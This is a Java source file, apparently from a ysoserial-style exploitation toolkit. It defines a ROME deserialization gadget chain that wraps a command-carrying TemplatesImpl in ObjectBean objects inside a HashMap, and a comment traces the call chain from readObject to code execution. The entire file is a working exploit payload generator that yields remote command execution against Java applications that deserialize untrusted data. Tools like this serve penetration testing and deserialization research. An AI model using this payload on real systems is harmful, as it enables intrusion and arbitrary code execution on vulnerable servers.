package ys.payloads;


import com.sun.syndication.feed.impl.ObjectBean;
import ys.payloads.annotation.Authors;
import ys.payloads.annotation.Dependencies;
import ys.payloads.util.Gadgets;
import ys.payloads.util.PayloadRunner;

import javax.xml.transform.Templates;

/**
 *
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 *
 * @author mbechler
 *
 */
@Dependencies("rome:rome:1.0")
@Authors({ Authors.MBECHLER })
public class ROME implements ObjectPayload<Object> {

    public Object getObject (String command ) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, templates);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(ROME.class, args);
    }

}
